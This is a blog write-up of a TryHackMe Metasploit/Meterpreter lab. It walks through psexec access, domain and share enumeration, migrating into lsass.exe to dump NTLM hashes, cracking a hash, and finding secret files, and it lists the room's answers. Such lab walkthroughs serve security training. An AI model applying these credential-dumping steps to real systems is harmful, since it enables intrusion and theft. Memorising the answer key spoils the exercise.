---
title: "Metasploit: Meterpreter (TryHackMe)"
datePublished: Wed Oct 30 2024 20:18:08 GMT+0000 (Coordinated Universal Time)
cuid: cm2wbjqaf000109jw7e35di97
slug: metasploit-meterpreter-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1730319437305/59a19bce-3bee-49bd-8482-3c495c86a75a.png
tags: tryhackme, metasploit, write-up, exploitation, meterpreter

---

In this article, I will write a write-up for Metasploit: Meterpreter that covers the Introduction to Meterpreter, Meterpreter Flavors, Meterpreter Commands, Post-Exploitation with Meterpreter, and Post-Exploitation Challenge.

This room is still as changeable as the previous one as a beginner but what I’ve learned so far:

* try and read through all areas
    
* the specific module to be used or user/password would’ve been provided
    
* if stuck always check if the question has a hint to help as a guide
    
* cybersecurity entails a lot of research, and the use of tools like ChatGPT, and Microsoft Copilot for a better understanding of terms or finding commands.
    
* The cybersecurity field is research-oriented, wide, and resourceful. Others have written write-ups and created YouTube channels, and communities, among others to help those who might be stuck while going through something they struggled with too, or as a way of giving back. We should also consider doing the same.
    
* For this room, I was trying to do it on my own but when stuck I would follow this YouTube channel which does a walkthrough of this room.
    

To access the Meterpreter on the Attackbox we’ve been told to: - `use exploit/windows/smb/psexec` - `set RHOSTS Target_IP_Address` - `show options` - `set MACHINE_IP` - `set SBMUser user_name` - `set SBMPass password`

1. What is the computer name? `ACME-TEST`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730319374776/c4445740-447a-46e0-afa4-571e292ecd8a.png align="center")
    
2. What is the target domain? `FLASH`
    

run `background` command this will switch back to msf6 where we had the `windows/smb/psexec` modules. You will use `post/windows/gather/enum_domain` module as provided on then hint then run `show options` this brings up `SESSION`then run `sessions` to see the available sessions then `set SESSION 1` then run or exploit this will show the `Domain name`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730319352236/27823e2c-bbbb-42e5-bb47-bf38fcd0ced2.png align="center")

3. What is the name of the share likely created by the user? `speedster`
    

based on the hint we have to use `post/windows/gather/enum_shares` then we `set SESSION 1` and we `run` again

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730319306363/caae9cee-d040-462d-902a-5b278c18575d.png align="center")

4. What is the NTLM hash of the jchambers user?
    

based on the hint we need to migrate to `pid` of `lsass.exe`. So we `use exploit/windows/smb/psexec` then we `exploit` to get back to the Meterpreter. We will run `ps` to search for the process we want which is `lsass.exe` then we run `migrate 772` and run `hashdump` command and you’ll see the result.  
  

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730319235667/7c4f4191-75dd-4715-bf7e-d7bf8f44188c.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730319109640/803b7da4-dd33-48d4-90b8-23fd36b78a63.png align="center")

5. What is the cleartext password of the jchambers user? `Trustno1`
    

use a Rainbow table like [crackstation](https://crackstation.net)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730319038089/fe1bd692-d79b-416d-98d5-6d630fa6584c.png align="center")

6. Where is the "secrets.txt"  file located? (Full path of the file) `c:\\Program Files (x86)\\Windows Multimedia Platform\\secrets.txt`
    

use `search -f secrets.txt` command \`\`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730318932427/d20cbdd2-2e26-4e53-9819-75b46e918d44.png align="center")

7. What is the Twitter password revealed in the "secrets.txt" file? `KDSvbsw3849!`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730318892661/2ba67169-f205-4e11-b21d-c95f75bd290d.png align="center")
    
8. Where is the "realsecret.txt" file located? (Full path of the file) `c:\\inetpub\\wwwroot\\realsecret.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730318817372/81498df6-efa8-438f-8922-c5163ea431ef.png align="center")
    
9. What is the real secret? `The Flash is the fastest man alive`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730318793422/a4ae5e19-b48b-448a-9389-b369608d895c.png align="center")
    

Thank you for reading my article. Please leave any questions or comments on improving my learning journey and the THM challenges. We can also connect more on [**LinkedIn**](https://www.linkedin.com/in/sharon-jebitok) or [**X**](https://x.com/SharonJebitok)**.**